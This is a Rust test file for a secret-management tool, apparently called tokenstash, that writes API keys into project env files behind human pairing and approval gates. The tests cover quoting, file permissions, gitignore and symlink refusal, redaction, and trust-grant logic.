#![cfg(test)]
use crate::*;
use crate::stash::Stash;
use secrecy::SecretString;
use std::path::PathBuf;

/// Tests that point TOKENSTASH_HOME at a temp dir mutate process-global state; the test
/// harness runs tests in parallel threads, so those tests must not overlap.
static ENV_LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());
fn env_lock() -> std::sync::MutexGuard<'static, ()> {
    base_home();
    ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner())
}

/// A home for every test, set once per process. Without it a test that never takes
/// `env_lock` — `envfile::write` keeps its lock under `config_dir()/locks`, `FileStash::new`
/// creates the config dir — writes into the developer's real `~/.config/tokenstash`. Locked
/// tests set their own home and restore this one instead of unsetting the variable, so an
/// unlocked test running beside them never falls back to the real home either.
fn base_home() -> PathBuf {
    static HOME: std::sync::OnceLock<PathBuf> = std::sync::OnceLock::new();
    HOME.get_or_init(|| {
        let p = std::env::temp_dir().join(format!("tokenstash-test-base-{}", std::process::id()));
        let _ = std::fs::create_dir_all(&p);
        std::env::set_var("TOKENSTASH_HOME", &p);
        p
    })
    .clone()
}

/// The human paired this key into this directory (what answering a pairing card records).
fn pair(db: &Db, proj: &std::path::Path, name: &str) {
    let ws = db.workspace_for(proj).unwrap();
    db.grant(&ws.id, name, "default", db::GRANT_KEY, db::GRANT_PAIRING).unwrap();
}

fn tmp(name: &str) -> PathBuf {
    base_home();
    let p = std::env::temp_dir().join(format!("tokenstash-test-{}-{}", name, std::process::id()));
    let _ = std::fs::remove_dir_all(&p);
    std::fs::create_dir_all(&p).unwrap();
    p
}

fn git_output(dir: &std::path::Path, args: &[&str]) -> std::process::Output {
    let environment: Vec<_> = std::env::vars_os()
        .filter(|(key, _)| !key.to_string_lossy().starts_with("GIT_"))
        .collect();
    let mut command = std::process::Command::new("git");
    command.env_clear().envs(environment)
        .arg("-C").arg(dir).args(args)
        .env("GIT_AUTHOR_NAME", "t").env("GIT_AUTHOR_EMAIL", "t@t")
        .env("GIT_COMMITTER_NAME", "t").env("GIT_COMMITTER_EMAIL", "t@t")
        .output().unwrap_or_else(|e| panic!("could not run git {args:?} in {}: {e}", dir.display()))
}

fn git(dir: &std::path::Path, args: &[&str]) {
    let output = git_output(dir, args);
    assert!(output.status.success(),
        "git {args:?} failed in {} with {}\nstdout:\n{}\nstderr:\n{}",
        dir.display(), output.status, String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr));
}

fn init_git(dir: &std::path::Path) {
    git(dir, &["init", "-q", "."]);
}

/// An in-memory stash with a hook at the exact point `set` runs. Tests use the hook to
/// attempt a write through a second SQLite connection while the store transaction is live.
struct HookStash<F> {
    values: std::cell::RefCell<std::collections::BTreeMap<String, String>>,
    hook: F,
    fail_set: bool,
}

impl<F> HookStash<F> {
    fn new(hook: F, fail_set: bool) -> Self {
        Self { values: std::cell::RefCell::new(Default::default()), hook, fail_set }
    }
}

impl<F: Fn() -> anyhow::Result<()>> stash::Stash for HookStash<F> {
    fn backend(&self) -> &'static str { "hook" }
    fn get(&self, key: &str) -> anyhow::Result<Option<SecretString>> {
        Ok(self.values.borrow().get(key).cloned().map(SecretString::from))
    }
    fn set(&self, key: &str, value: &SecretString) -> anyhow::Result<()> {
        (self.hook)()?;
        if self.fail_set {
            anyhow::bail!("injected stash failure");
        }
        self.values.borrow_mut().insert(key.to_string(), secrecy::ExposeSecret::expose_secret(value).to_string());
        Ok(())
    }
    fn delete(&self, key: &str) -> anyhow::Result<bool> {
        Ok(self.values.borrow_mut().remove(key).is_some())
    }
}

/// A real stash with a hook that runs once, on the first `get` after `armed` is set and
/// after that read. Tests use it to make another process act at the moment a caller has
/// read a value but not yet acted on it.
struct GetHookStash<F> {
    inner: Box<dyn stash::Stash>,
    armed: std::cell::Cell<bool>,
    hook: F,
}

impl<F: Fn()> stash::Stash for GetHookStash<F> {
    fn backend(&self) -> &'static str { "get-hook" }
    fn get(&self, key: &str) -> anyhow::Result<Option<SecretString>> {
        let v = self.inner.get(key)?;
        if self.armed.replace(false) {
            (self.hook)();
        }
        Ok(v)
    }
    fn set(&self, key: &str, value: &SecretString) -> anyhow::Result<()> { self.inner.set(key, value) }
    fn delete(&self, key: &str) -> anyhow::Result<bool> { self.inner.delete(key) }
}

#[test]
fn registry_is_sane() {
    assert!(registry::count() >= 40);
    for p in registry::all() {
        assert!(p.url.starts_with("https://"), "{} url", p.name);
        if let Some(pat) = &p.pattern { regex::Regex::new(pat).unwrap_or_else(|_| panic!("bad pattern for {}", p.name)); }
        if let Some(pat) = &p.sensitive_pattern { regex::Regex::new(pat).unwrap(); }
        if let Some(c) = &p.check {
            assert!(c.url.starts_with("https://"), "{} check url", p.name);
            assert!(matches!(c.method.as_str(), "GET" | "POST"), "{} check method {}", p.name, c.method);
            // An auth style validate::liveness does not understand falls into its
            // catch-all arm and sends the probe with no credential at all, which
            // makes the check silently meaningless. Typos must fail here instead.
            let known = c.auth == "bearer"
                || c.auth == "basic-user"
                || c.auth.strip_prefix("header:").is_some_and(|s| !s.is_empty())
                || c.auth.strip_prefix("prefix:").is_some_and(|s| !s.is_empty())
                || c.auth.strip_prefix("query:").is_some_and(|s| !s.is_empty());
            assert!(known, "{} unsupported check auth {:?}", p.name, c.auth);
            for s in &c.reject_status {
                assert!((400..600).contains(s), "{} reject_status {}", p.name, s);
                assert!(*s != 401, "{} reject_status {} is already implied", p.name, s);
            }
        }
        assert!(p.name.chars().all(|c| c.is_ascii_uppercase() || c.is_ascii_digit() || c == '_'), "{} name", p.name);
    }
}

#[test]
fn envfile_upserts_and_quotes_and_restricts() {
    let dir = tmp("envfile");
    let v1 = SecretString::from("plain-value".to_string());
    let v2 = SecretString::from("has space # and \"quotes\"".to_string());
    envfile::write(&dir, ".env.local", "A_KEY", &v1).unwrap();
    envfile::write(&dir, ".env.local", "B_KEY", &v2).unwrap();
    envfile::write(&dir, ".env.local", "A_KEY", &SecretString::from("second".to_string())).unwrap();
    let s = std::fs::read_to_string(dir.join(".env.local")).unwrap();
    assert_eq!(s.lines().filter(|l| l.starts_with("A_KEY=")).count(), 1);
    assert!(s.contains("A_KEY=second"));
    assert!(s.contains("B_KEY=\"has space # and \\\"quotes\\\"\""));
    assert!(envfile::has(&dir, ".env.local", "B_KEY"));
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        assert_eq!(std::fs::metadata(dir.join(".env.local")).unwrap().permissions().mode() & 0o777, 0o600);
    }
}

#[test]
fn gitignore_is_enforced_in_repos() {
    let dir = tmp("gitignore");
    init_git(&dir);
    std::fs::write(dir.join(".gitignore"), "node_modules\n").unwrap();
    let sub = dir.join("packages/app");
    std::fs::create_dir_all(&sub).unwrap();
    envfile::write(&sub, ".env.local", "K", &SecretString::from("v".to_string())).unwrap();
    let gi = std::fs::read_to_string(dir.join(".gitignore")).unwrap();
    assert!(gi.lines().any(|l| l == ".env.local"));
    // idempotent
    assert!(!envfile::ensure_gitignore(&sub, ".env.local").unwrap());
    // already covered by a glob
    std::fs::write(dir.join(".gitignore"), ".env*\n").unwrap();
    assert!(!envfile::ensure_gitignore(&sub, ".env.local").unwrap());
    // a symlinked .gitignore is refused, and the symlink target is untouched
    #[cfg(unix)]
    {
        let target = dir.join("elsewhere.txt");
        std::fs::write(&target, "keep me\n").unwrap();
        std::fs::remove_file(dir.join(".gitignore")).unwrap();
        std::os::unix::fs::symlink(&target, dir.join(".gitignore")).unwrap();
        assert!(envfile::ensure_gitignore(&sub, ".env.local").is_err());
        assert!(envfile::write(&sub, ".env.local", "K2", &SecretString::from("vvvvvvvv".to_string())).is_err(), "injection must fail when .gitignore cannot be enforced");
        assert_eq!(std::fs::read_to_string(&target).unwrap(), "keep me\n");
    }
}

#[test]
fn trust_gate_logic() {
    // A grant is (workspace, key, identity). Nothing is inferred from folders.
    let dir = tmp("trust");
    let db = Db::open(&dir.join("t.db")).unwrap();
    let proj = dir.join("code/proj");
    std::fs::create_dir_all(&proj).unwrap();
    let ws = db.workspace_for(&proj).unwrap();
    let pairing = |g: &trust::Gate| matches!(g, trust::Gate::NeedsApproval { reason: trust::GateReason::Pairing });
    let sens = |g: &trust::Gate| matches!(g, trust::Gate::NeedsApproval { reason: trust::GateReason::Sensitive });
    let open = |g: &trust::Gate| matches!(g, trust::Gate::Open { .. });
    assert!(pairing(&trust::gate(&db, &ws, "OPENAI_API_KEY", "default", false, true).unwrap()));
    assert!(sens(&trust::gate(&db, &ws, "AWS_SECRET_ACCESS_KEY", "default", true, true).unwrap()));
    assert!(sens(&trust::gate(&db, &ws, "MY_INTERNAL_TOKEN", "default", false, false).unwrap()), "unregistered keys are per-key decisions");
    // an exact grant opens exactly that (key, identity)
    db.grant(&ws.id, "OPENAI_API_KEY", "default", db::GRANT_KEY, db::GRANT_PAIRING).unwrap();
    assert!(open(&trust::gate(&db, &ws, "OPENAI_API_KEY", "default", false, true).unwrap()));
    assert!(pairing(&trust::gate(&db, &ws, "OPENAI_API_KEY", "work", false, true).unwrap()), "another identity is another grant");
    assert!(pairing(&trust::gate(&db, &ws, "GROQ_API_KEY", "default", false, true).unwrap()));
    // a broad grant covers registry non-sensitive keys for its identity, never sensitive ones
    db.grant(&ws.id, "*", "default", db::GRANT_BROAD, db::GRANT_PAIRING).unwrap();
    assert!(open(&trust::gate(&db, &ws, "GROQ_API_KEY", "default", false, true).unwrap()));
    assert!(pairing(&trust::gate(&db, &ws, "GROQ_API_KEY", "work", false, true).unwrap()));
    assert!(sens(&trust::gate(&db, &ws, "AWS_SECRET_ACCESS_KEY", "default", true, true).unwrap()));
    assert!(sens(&trust::gate(&db, &ws, "MY_INTERNAL_TOKEN", "default", false, false).unwrap()));
    db.grant(&ws.id, "AWS_SECRET_ACCESS_KEY", "default", db::GRANT_KEY, db::GRANT_SENSITIVE).unwrap();
    assert!(open(&trust::gate(&db, &ws, "AWS_SECRET_ACCESS_KEY", "default", true, true).unwrap()));
    // another directory shares nothing
    let other = dir.join("code/other");
    std::fs::create_dir_all(&other).unwrap();
    let ws2 = db.workspace_for(&other).unwrap();
    assert_ne!(ws.id, ws2.id);
    assert!(pairing(&trust::gate(&db, &ws2, "OPENAI_API_KEY", "default", false, true).unwrap()));
}

#[test]
fn redactor_scrubs_values() {
    let r = redact::Redactor::new().with(&SecretString::from("sk-super-secret-value".to_string()));
    assert_eq!(r.redact("error: sk-super-secret-value rejected"), "error: [redacted] rejected");
    assert_eq!(redact::mask(&SecretString::from("sk-1234567890".to_string())), "sk-…90");
    assert_eq!(redact::mask(&SecretString::from("short".to_string())), "••••");
}

#[test]
fn redactor_handles_short_values_and_unicode() {
    // short values are redacted where they stand alone, not inside other words
    let r = redact::Redactor::new().with(&SecretString::from("ab".to_string()));
    assert_eq!(r.redact("token ab rejected"), "token [redacted] rejected");
    assert_eq!(r.redact("(ab)"), "([redacted])");
    assert_eq!(r.redact("cabbage about"), "cabbage about");
    assert_eq!(r.redact("ab"), "[redacted]");
    // multibyte values must not panic in mask()
    assert_eq!(redact::mask(&SecretString::from("ключ-секрет-значение".to_string())), "клю…ие");
    let r = redact::Redactor::new().with(&SecretString::from("ключ".to_string()));
    assert_eq!(r.redact("got ключ back"), "got [redacted] back");
}

#[test]
fn envfile_round_trips_adversarial_values() {
    let dir = tmp("envfile-rt");
    let cases = [
        "plain", "with space", "has#hash", "has\"quote", "back\\slash", "dollar$sign", "back`tick",
        "single'quote", "=leading-eq", "trailing-eq=", " padded ", "uni-ключ", "multi\nline",
        "-----BEGIN PRIVATE KEY-----\nMIIBVgIBADAN\n-----END PRIVATE KEY-----", "crlf\r\nvalue", "",
    ];
    for (i, v) in cases.iter().enumerate() {
        let name = format!("K{i}");
        envfile::write(&dir, ".env.local", &name, &SecretString::from(v.to_string())).unwrap();
    }
    let s = std::fs::read_to_string(dir.join(".env.local")).unwrap();
    for (i, v) in cases.iter().enumerate() {
        let line = s.lines().find(|l| l.starts_with(&format!("K{i}="))).unwrap_or_else(|| panic!("missing K{i}"));
        let (k, parsed) = envfile::parse_line(line).unwrap();
        assert_eq!(k, format!("K{i}"));
        assert_eq!(&parsed, v, "round trip failed for {v:?} (line: {line})");
    }
    assert!(!s.contains("export "), "we never emit export");
    // One key per line, always: a value with a newline in it is escaped, not emitted raw.
    // A raw newline would end the line for every one-line reader — including parse_line,
    // which is what rotation uses to decide a project still holds the old value.
    assert_eq!(s.lines().count(), cases.len(), "one line per key\n{s}");
    for line in s.lines() {
        assert!(envfile::parse_line(line).is_some(), "every line we write parses: {line}");
    }
}

#[test]
fn find_task_prefix_rules() {
    let dir = tmp("find-task");
    let db = Db::open(&dir.join("t.db")).unwrap();
    let mk = |id: &str| db::Task {
        id: id.into(), kind: db::TaskKind::Secret, project: "/p".into(), agent: "t".into(), name: Some("X".into()),
        identity: "default".into(), title: "x".into(), why: None, url: None, steps: vec![], expects: "secret".into(),
        pattern: None, names: vec![], status: db::TaskStatus::Pending, created: now(), deadline: now(), answered_at: None, note: None,
    };
    db.insert_task(&mk("t_abc111")).unwrap();
    db.insert_task(&mk("t_abc222")).unwrap();
    db.insert_task(&mk("a_zzz999")).unwrap();
    assert_eq!(db.find_task("t_abc111").unwrap().unwrap().id, "t_abc111");
    assert_eq!(db.find_task("abc111").unwrap().unwrap().id, "t_abc111");
    assert_eq!(db.find_task("zzz").unwrap().unwrap().id, "a_zzz999");
    assert!(db.find_task("abc").is_err(), "ambiguous prefix must error");
    assert!(db.find_task("").is_err(), "empty must error");
    assert!(db.find_task("%").is_err(), "wildcards must error");
    assert!(db.find_task("nope").unwrap().is_none());
}

#[test]
fn workspace_identity_is_the_directory_not_the_path_string() {
    let dir = tmp("ws-ident");
    let db = Db::open(&dir.join("t.db")).unwrap();
    let proj = dir.join("code/proj");
    std::fs::create_dir_all(&proj).unwrap();
    let ws = db.workspace_for(&proj).unwrap();
    // spellings of the same directory resolve to one workspace
    assert_eq!(db.workspace_for(&dir.join("code/./proj/../proj")).unwrap().id, ws.id);
    #[cfg(unix)]
    {
        let link = dir.join("link");
        std::os::unix::fs::symlink(&proj, &link).unwrap();
        assert_eq!(db.workspace_for(&link).unwrap().id, ws.id, "a symlink is the directory it points at");
    }
    // find never creates
    assert!(db.find_workspace(&dir.join("code/nothing-here")).unwrap().is_none());
    assert!(db.workspace_for(&dir.join("code/does-not-exist")).is_err());
    // the same path, re-created, is a different directory: grants do not carry over
    db.grant(&ws.id, "OPENAI_API_KEY", "default", db::GRANT_KEY, db::GRANT_PAIRING).unwrap();
    std::fs::remove_dir_all(&proj).unwrap();
    std::thread::sleep(std::time::Duration::from_millis(20));
    std::fs::create_dir_all(&proj).unwrap();
    let again = db.workspace_for(&proj).unwrap();
    assert_eq!(again.id, ws.id, "the record stays until a human pairs the new directory");
    assert!(!again.fingerprint_ok, "…but it is flagged, and no grant applies");
    assert!(matches!(trust::gate(&db, &again, "OPENAI_API_KEY", "default", false, true).unwrap(), trust::Gate::NeedsApproval { .. }));
    assert!(db.find_workspace(&proj).unwrap().is_none());
    // the human pairs the new directory: old grants go, a new record replaces the old
    let fresh = db.repair_workspace(&proj).unwrap();
    assert_ne!(fresh.id, ws.id);
    assert!(fresh.fingerprint_ok);
    assert!(db.grants_for(&ws.id).unwrap().is_empty(), "old grants revoked");
    assert!(db.grants_for(&fresh.id).unwrap().is_empty());
    // refused roots
    assert!(trust::refused_root(std::path::Path::new("/")).is_some());
    assert!(trust::refused_root(&dirs::home_dir().unwrap()).is_some());
    assert!(trust::refused_root(std::path::Path::new("/tmp")).is_some());
    assert!(trust::refused_root(&proj).is_none(), "a child of /tmp is fine");
}

#[test]
fn require_approval_gates_even_hits() {
    let _env = env_lock();
    let home = tmp("req-approval-home");
    std::env::set_var("TOKENSTASH_HOME", &home);
    std::env::set_var("TOKENSTASH_STASH", "insecure-file");
    let proj = tmp("req-approval-proj").canonicalize().unwrap();
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    stash.set(&stash::stash_key("GROQ_API_KEY", "default"), &SecretString::from("gsk_x".to_string())).unwrap();
    db.upsert_secret(&db::SecretMeta { name: "GROQ_API_KEY".into(), identity: "default".into(), provider: None, sensitive: false, source_url: None, created: now(), last_used: None, stale: false, last_verified: None, stale_reason: None, stale_source: None, next_probe: None, verify_off: false }).unwrap();
    // normal hit in a paired directory: silent
    pair(&db, &proj, "GROQ_API_KEY");
    let out = need::need(&ctx, &proj, "t", &["GROQ_API_KEY".to_string()], &need::NeedOpts::default()).unwrap();
    assert!(matches!(out[0], need::Outcome::Injected { .. }));
    // same hit from untrusted input: must produce an approval task instead
    let out = need::need(&ctx, &proj, "run", &["GROQ_API_KEY".to_string()], &need::NeedOpts { require_approval: true, ..Default::default() }).unwrap();
    let tid = match &out[0] { need::Outcome::Pending { task_id, .. } => task_id.clone(), other => panic!("expected approval, got {other:?}") };
    assert!(tid.starts_with("a_"));
    // approval injects; but a later program-derived request must ask again — persisted
    // approval never authorizes a fresh untrusted request
    tasks::answer_approval(&ctx, &db.get_task(&tid).unwrap().unwrap(), tasks::Decision::Allow, None).unwrap();
    assert!(envfile::has(&proj, ".env.local", "GROQ_API_KEY"));
    let out = need::need(&ctx, &proj, "run", &["GROQ_API_KEY".to_string()], &need::NeedOpts { require_approval: true, ..Default::default() }).unwrap();
    assert!(matches!(out[0], need::Outcome::Pending { .. }), "require_approval must ask every time");
    // ordinary requests in the trusted project stay silent
    let out = need::need(&ctx, &proj, "t", &["GROQ_API_KEY".to_string()], &need::NeedOpts::default()).unwrap();
    assert!(matches!(out[0], need::Outcome::Injected { .. }));
}

#[test]
fn file_stash_is_atomic_and_locked() {
    let _env = env_lock();
    let home = tmp("stash-atomic");
    std::env::set_var("TOKENSTASH_HOME", &home);
    std::env::set_var("TOKENSTASH_STASH", "insecure-file");
    let cfg = Config::default();
    let st = stash::open(&cfg).unwrap();
    st.set("A@default", &SecretString::from("valuevalue".to_string())).unwrap();
    let path = home.join("insecure-stash.json");
    // corrupt file is an error, not silently emptied
    std::fs::write(&path, "{not json").unwrap();
    assert!(st.get("A@default").is_err());
    assert!(st.set("B@default", &SecretString::from("bbbbbbbb".to_string())).is_err(), "must not overwrite a corrupt stash");
    assert_eq!(std::fs::read_to_string(&path).unwrap(), "{not json", "corrupt content preserved for recovery");
    std::fs::write(&path, "{}").unwrap();
    // symlinked destination is refused
    let target = home.join("elsewhere.json");
    std::fs::write(&target, "{}").unwrap();
    std::fs::remove_file(&path).unwrap();
    #[cfg(unix)]
    {
        std::os::unix::fs::symlink(&target, &path).unwrap();
        assert!(st.set("C@default", &SecretString::from("cccccccc".to_string())).is_err(), "must not write through a symlink");
        assert_eq!(std::fs::read_to_string(&target).unwrap(), "{}", "symlink target untouched");
        std::fs::remove_file(&path).unwrap();
    }
    // concurrent writers (separate handles, as two processes would have) do not lose
    // each other's updates
    let cfg2 = cfg.clone();
    let h = std::thread::spawn(move || {
        let st2 = stash::open(&cfg2).unwrap();
        for i in 0..25 { st2.set(&format!("T{i}@default"), &SecretString::from("threadval".to_string())).unwrap(); }
    });
    for i in 0..25 { st.set(&format!("M{i}@default"), &SecretString::from("mainvalue".to_string())).unwrap(); }
    h.join().unwrap();
    for i in 0..25 {
        assert!(st.get(&format!("T{i}@default")).unwrap().is_some(), "lost T{i}");
        assert!(st.get(&format!("M{i}@default")).unwrap().is_some(), "lost M{i}");
    }
    // no stray temp files. The advisory lock file persists by design (an OS lock is held on
    // an open handle; deleting the file would race other holders) and must be empty + 0600.
    let leftovers: Vec<_> = std::fs::read_dir(&home).unwrap().filter_map(|e| e.ok()).map(|e| e.file_name().to_string_lossy().to_string()).filter(|n| n.contains(".tmp")).collect();
    assert!(leftovers.is_empty(), "leftover temp files: {leftovers:?}");
    let lock = home.join("insecure-stash.lock");
    assert_eq!(std::fs::metadata(&lock).unwrap().len(), 0, "lock file must not carry data");
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        assert_eq!(std::fs::metadata(&lock).unwrap().permissions().mode() & 0o777, 0o600);
    }
}

#[test]
fn need_end_to_end_with_file_stash() {
    let _env = env_lock();
    let home = tmp("need-home");
    std::env::set_var("TOKENSTASH_HOME", &home);
    std::env::set_var("TOKENSTASH_STASH", "insecure-file");
    let proj = tmp("need-proj");
    let proj = proj.canonicalize().unwrap();
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    let names = vec!["OPENAI_API_KEY".to_string(), "AUTH_SECRET".to_string()];
    let out = need::need(&ctx, &proj, "test", &names, &need::NeedOpts::default()).unwrap();
    assert!(matches!(out[0], need::Outcome::Pending { .. }));
    assert!(matches!(out[1], need::Outcome::Injected { generated: true, .. }));
    // answer
    let tid = match &out[0] { need::Outcome::Pending { task_id, .. } => task_id.clone(), _ => unreachable!() };
    let t = db.get_task(&tid).unwrap().unwrap();
    let bad = tasks::answer_secret(&ctx, &t, SecretString::from("nope".to_string()), true);
    assert!(bad.is_err(), "pattern must reject");
    tasks::answer_secret(&ctx, &t, SecretString::from("sk-LEAKCANARY-unit".to_string()), true).unwrap();
    let env = std::fs::read_to_string(proj.join(".env.local")).unwrap();
    assert!(env.contains("OPENAI_API_KEY=sk-LEAKCANARY-unit"));
    // second call is a silent hit
    let out = need::need(&ctx, &proj, "test", &names[..1], &need::NeedOpts::default()).unwrap();
    assert!(matches!(out[0], need::Outcome::Injected { generated: false, .. }));
    // deny memory
    let out = need::need(&ctx, &proj, "test", &["STRIPE_SECRET_KEY".to_string()], &need::NeedOpts::default()).unwrap();
    let tid = match &out[0] { need::Outcome::Pending { task_id, .. } => task_id.clone(), _ => unreachable!() };
    tasks::deny(&ctx, &db.get_task(&tid).unwrap().unwrap(), None).unwrap();
    let out = need::need(&ctx, &proj, "test", &["STRIPE_SECRET_KEY".to_string()], &need::NeedOpts::default()).unwrap();
    assert!(matches!(out[0], need::Outcome::Denied { .. }), "deny must be remembered");
    let out = need::need(&ctx, &proj, "test", &["STRIPE_SECRET_KEY".to_string()], &need::NeedOpts { force: true, ..Default::default() }).unwrap();
    assert!(matches!(out[0], need::Outcome::Pending { .. }), "--force asks again");
    // nothing in the db
    let raw = std::fs::read(home.join("t.db")).unwrap();
    assert!(!String::from_utf8_lossy(&raw).contains("LEAKCANARY"), "value leaked into db");
}

#[test]
fn text_answers_that_look_like_secrets_are_refused() {
    use validate::looks_like_secret;
    assert!(looks_like_secret("sk-abcdefghijklmnopqrstuvwxyz012345"));
    assert!(looks_like_secret("re_123456789_ABCDEFGHIJKLMNOPQRSTUV"));
    assert!(looks_like_secret("eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.abcDEF123"));
    assert!(looks_like_secret("postgres://user:pass@db.example.com/app"));
    assert!(!looks_like_secret("us-east-1"));
    assert!(!looks_like_secret("yes, the DNS record is live now"));
    assert!(!looks_like_secret("project id is my-app-prod"));

    let home = tmp("human-refuse");
    let db = Db::open(&home.join("t.db")).unwrap();
    let cfg = Config::default();
    let st = stash::FileStash::new().unwrap(); // never touched by this test
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: &st, probe: tasks::Probe::Off };
    let t = tasks::create_human_task(&ctx, &home, "t", tasks::HumanRequest { title: "which region?".into(), why: None, url: None, steps: vec![], expects: "text".into() }).unwrap();
    assert!(tasks::answer_human(&ctx, &t, Some("sk-abcdefghijklmnopqrstuvwxyz012345")).is_err());
    assert_eq!(db.get_task(&t.id).unwrap().unwrap().status, db::TaskStatus::Pending, "refused answer must not close the task");
    tasks::answer_human(&ctx, &t, Some("us-east-1")).unwrap();
    assert_eq!(db.get_task(&t.id).unwrap().unwrap().status, db::TaskStatus::Answered);
}

#[test]
fn answering_a_secret_marks_the_task_before_injection() {
    let _env = env_lock();
    let home = tmp("answer-tx-home");
    std::env::set_var("TOKENSTASH_HOME", &home);
    std::env::set_var("TOKENSTASH_STASH", "insecure-file");
    let proj = tmp("answer-tx-proj").canonicalize().unwrap();
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    let out = need::need(&ctx, &proj, "t", &["RESEND_API_KEY".to_string()], &need::NeedOpts::default()).unwrap();
    let tid = match &out[0] { need::Outcome::Pending { task_id, .. } => task_id.clone(), _ => unreachable!() };
    let task = db.get_task(&tid).unwrap().unwrap();
    // make injection fail: the env file path is a symlink → refused
    std::os::unix::fs::symlink(proj.join("elsewhere"), proj.join(".env.local")).unwrap();
    let r = tasks::answer_secret(&ctx, &task, SecretString::from("re_validvalue_123456".to_string()), true);
    assert!(r.is_err(), "injection through a symlink must fail");
    // ...but the value is stored and the task is answered, so nothing is asked twice
    assert!(stash.get("RESEND_API_KEY@default").unwrap().is_some());
    assert_eq!(db.get_task(&tid).unwrap().unwrap().status, db::TaskStatus::Answered);
    assert!(db.get_secret("RESEND_API_KEY", "default").unwrap().is_some());
    // a blocking wait must not report Injected while the file is still unwritable...
    let blocking = need::NeedOpts { blocking: true, timeout: std::time::Duration::from_millis(200), ..Default::default() };
    let r = need::need(&ctx, &proj, "t", &["RESEND_API_KEY".to_string()], &blocking);
    assert!(r.is_err(), "must surface the injection failure, not claim success");
    // ...and once the obstacle is gone, the next call injects from the stash without asking
    std::fs::remove_file(proj.join(".env.local")).unwrap();
    let out = need::need(&ctx, &proj, "t", &["RESEND_API_KEY".to_string()], &need::NeedOpts::default()).unwrap();
    assert!(matches!(out[0], need::Outcome::Injected { .. }));
    assert!(envfile::has(&proj, ".env.local", "RESEND_API_KEY"));
}

#[test]
fn same_name_different_identities_get_separate_tasks() {
    let _env = env_lock();
    let home = tmp("ident-home");
    std::env::set_var("TOKENSTASH_HOME", &home);
    std::env::set_var("TOKENSTASH_STASH", "insecure-file");
    let proj = tmp("ident-proj").canonicalize().unwrap();
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    let name = vec!["OPENAI_API_KEY".to_string()];
    let work = need::need(&ctx, &proj, "t", &name, &need::NeedOpts { identity: Some("work".into()), ..Default::default() }).unwrap();
    let personal = need::need(&ctx, &proj, "t", &name, &need::NeedOpts { identity: Some("personal".into()), ..Default::default() }).unwrap();
    let (tw, tp) = match (&work[0], &personal[0]) {
        (need::Outcome::Pending { task_id: a, .. }, need::Outcome::Pending { task_id: b, .. }) => (a.clone(), b.clone()),
        other => panic!("expected two pending tasks, got {other:?}"),
    };
    assert_ne!(tw, tp, "different identities must not share a task");
    assert_eq!(db.get_task(&tw).unwrap().unwrap().identity, "work");
    assert_eq!(db.get_task(&tp).unwrap().unwrap().identity, "personal");
    // answering the work task stores under @work only
    tasks::answer_secret(&ctx, &db.get_task(&tw).unwrap().unwrap(), SecretString::from("sk-workworkwork123".to_string()), true).unwrap();
    assert!(stash.get("OPENAI_API_KEY@work").unwrap().is_some());
    assert!(stash.get("OPENAI_API_KEY@personal").unwrap().is_none());
    assert_eq!(db.get_task(&tp).unwrap().unwrap().status, db::TaskStatus::Pending, "personal task untouched");
    // a repeat request for the same identity reuses its open task; denial is per identity too
    let again = need::need(&ctx, &proj, "t", &name, &need::NeedOpts { identity: Some("personal".into()), ..Default::default() }).unwrap();
    assert!(matches!(&again[0], need::Outcome::Pending { task_id, .. } if *task_id == tp));
    tasks::deny(&ctx, &db.get_task(&tp).unwrap().unwrap(), None).unwrap();
    let denied = need::need(&ctx, &proj, "t", &name, &need::NeedOpts { identity: Some("personal".into()), ..Default::default() }).unwrap();
    assert!(matches!(denied[0], need::Outcome::Denied { .. }));
    let work_hit = need::need(&ctx, &proj, "t", &name, &need::NeedOpts { identity: Some("work".into()), ..Default::default() }).unwrap();
    assert!(matches!(work_hit[0], need::Outcome::Injected { .. }), "work identity unaffected by personal denial");
}

#[test]
fn tracked_env_file_is_refused_until_untracked() {
    let dir = tmp("tracked-env");
    init_git(&dir);
    // the classic mistake: the env file was committed before anyone thought about it
    std::fs::write(dir.join(".env.local"), "OLD=1\n").unwrap();
    git(&dir, &["add", ".env.local"]);
    git(&dir, &["commit", "-q", "-m", "oops"]);
    assert!(envfile::is_git_tracked(&dir, &dir.join(".env.local")));
    let err = envfile::write(&dir, ".env.local", "K", &SecretString::from("vvvvvvvv".to_string())).unwrap_err();
    assert!(err.to_string().contains("git rm --cached"), "must tell the user how to fix it: {err}");
    assert_eq!(std::fs::read_to_string(dir.join(".env.local")).unwrap(), "OLD=1\n", "tracked file untouched");
    // after untracking, injection proceeds and the ignore rule is added
    git(&dir, &["rm", "-q", "--cached", ".env.local"]);
    assert!(!envfile::is_git_tracked(&dir, &dir.join(".env.local")));
    envfile::write(&dir, ".env.local", "K", &SecretString::from("vvvvvvvv".to_string())).unwrap();
    assert!(envfile::has(&dir, ".env.local", "K"));
    assert!(std::fs::read_to_string(dir.join(".gitignore")).unwrap().lines().any(|l| l == ".env.local"));
}

#[test]
fn git_trackedness_allows_a_standalone_directory() {
    let dir = tmp("trackedness-standalone");
    assert!(!envfile::git_trackedness(&dir, &dir.join(".env.local")).unwrap());
    envfile::write(&dir, ".env.local", "K", &SecretString::from("vvvvvvvv".to_string())).unwrap();
    assert!(envfile::has(&dir, ".env.local", "K"));
}

#[test]
fn tracked_env_filename_is_a_literal_not_a_git_pathspec() {
